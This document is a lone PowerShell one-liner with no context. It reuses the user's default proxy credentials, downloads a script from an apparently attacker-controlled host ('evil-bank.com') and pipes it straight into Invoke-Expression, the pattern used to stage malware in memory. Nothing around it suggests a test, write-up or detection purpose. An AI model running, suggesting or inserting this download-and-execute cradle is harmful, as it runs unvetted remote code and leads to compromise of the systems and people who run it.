(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://evil-bank.com/download/powershell/')-UseBasicParsing|iex
